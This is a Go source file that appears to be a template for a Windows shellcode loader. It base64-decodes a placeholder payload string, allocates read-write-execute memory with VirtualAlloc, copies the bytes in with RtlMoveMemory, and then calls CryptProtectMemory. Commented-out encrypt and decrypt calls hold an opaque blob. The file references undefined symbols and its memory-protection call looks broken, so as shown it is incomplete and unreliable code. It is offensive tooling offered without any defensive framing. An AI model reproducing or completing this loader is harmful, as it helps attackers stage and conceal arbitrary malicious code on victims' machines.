package main

import (
	"encoding/base64"
	"syscall"
	"unsafe"
)

func main() {

	var (
		kernel32      = syscall.MustLoadDLL("kernel32.dll")
		ntdll         = syscall.MustLoadDLL("ntdll.dll")
		VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
		RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
	)

	const (
		MEM_COMMIT             = 0x1000
		MEM_RESERVE            = 0x2000
		PAGE_EXECUTE_READWRITE = 0x40
	)

	/*	s, err := Encrypt("afd")
		if err != nil {
			return
		}
		println(s)*/

	/*	s,_:= Decrypt("AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAA5Vj52Htm+kOtAg/l1qc35AAAAAACAAAAAAAQZgAAAAEAACAAAABNQhUTQ6cfvjoE6FpcL/cDAqoe5AwuMZP/+rgvot7G4AAAAAAOgAAAAAIAACAAAADZGkd9+C+/oOeMYSB2eqWlMMNYCypxs0Eogrcw+WnfDRAAAACCOXMquX3UdkklqdpXRUZOQAAAAEuc1o99YO31qmUSOGZDWGgCFXm8p9fT/C3JyKi6lscKoDHyolGKSSJAkSYCw5o214qjebHWFRNM+Wa9un7r9g4=")
		println(s)*/

	ss, _ := base64.StdEncoding.DecodeString("string2000022154")

	charcode := []byte(ss)

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))

	_, _, err := procCryptProtectMemory.Call(uintptr(unsafe.Pointer(&addr)), uintptr(0), uintptr(CRYPTPROTECTMEMORY_SAME_PROCESS))
	if err != nil {
		panic(err)
	}

	//EncryptMemory(&addr,len(charcode))

}
